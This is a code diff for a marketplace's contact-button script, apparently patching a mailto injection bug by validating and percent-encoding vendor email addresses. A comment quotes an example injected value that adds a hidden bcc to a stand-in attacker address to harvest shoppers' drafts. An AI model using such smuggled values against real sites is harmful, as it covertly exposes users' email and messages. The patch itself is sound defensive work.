@@ -40,6 +40,21 @@
       return res;
     });
   }
+  // SEC-067: vendors.contact_email is owner-writable and is NOT format-checked
+  // anywhere server-side, so it can carry mailto syntax. Interpolated raw ahead
+  // of the '?', a value like "me@shop.com?bcc=harvest@evil.com" adds the
+  // vendor's own recipients and body to the SHOPPER's draft. mailAddr keeps the
+  // one literal '@' a mail client needs and percent-encodes everything else, so
+  // '?', '&' and '%' can never act as URL syntax; looksLikeEmail drops anything
+  // not shaped like an address so we never open a junk draft. Same shape as
+  // lokali-account.js nudgeMailto().
+  function looksLikeEmail(s) {
+    var v = String(s == null ? '' : s).trim();
+    return v.length > 0 && v.length <= 254 && /^[^\s@<>"',;:?&#%]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(v);
+  }
+  function mailAddr(email) {
+    return encodeURIComponent(String(email).trim()).replace(/%40/g, '@');
+  }
   function asArray(raw) {
     if (Array.isArray(raw)) return raw;
     if (raw && typeof raw === 'object') {
@@ -417,9 +432,9 @@
         return;
       }
       // the form script failed to load: the old mailto beats a dead button
-      if (email) {
+      if (looksLikeEmail(email)) {
         v2Track(vid, 'email', isProduct);
-        window.location.href = 'mailto:' + email + '?subject=' + encodeURIComponent('I found you on Lokali: inquiry about ' + (itemName || (isProduct ? 'your product' : 'your service')));
+        window.location.href = 'mailto:' + mailAddr(email) + '?subject=' + encodeURIComponent('I found you on Lokali: inquiry about ' + (itemName || (isProduct ? 'your product' : 'your service')));
       }
     });
     var callPill = v2Channels(v, vid, itemName, isProduct);
@@ -841,11 +856,11 @@
       // inbox) instead of a mailto. The mailto below is the legacy path, kept
       // for the day the redesigned layout cannot mount.
       if (v2Contact(v, vendorId, itemName, isProduct)) return v;
-      if (cta && v.contact_email) {
+      if (cta && looksLikeEmail(v.contact_email)) {
         var subj = 'I found you on Lokali: inquiry about ' + (itemName || (isProduct ? 'your product' : 'your service'));
         var body = "Hi " + (v.business_name || 'there') + ", I found your listing on Lokali and I'm interested in " +
           (itemName ? ('"' + itemName + '"') : (isProduct ? 'ordering this product' : 'this service')) + '.';
-        cta.href = 'mailto:' + v.contact_email + '?subject=' + encodeURIComponent(subj) + '&body=' + encodeURIComponent(body);
+        cta.href = 'mailto:' + mailAddr(v.contact_email) + '?subject=' + encodeURIComponent(subj) + '&body=' + encodeURIComponent(body);
         // Log the contact click as a lead event (fire-and-forget; mailto still opens).
         cta.addEventListener('click', function () {
           if (window.LokaliAPI && window.LokaliAPI.leads) {
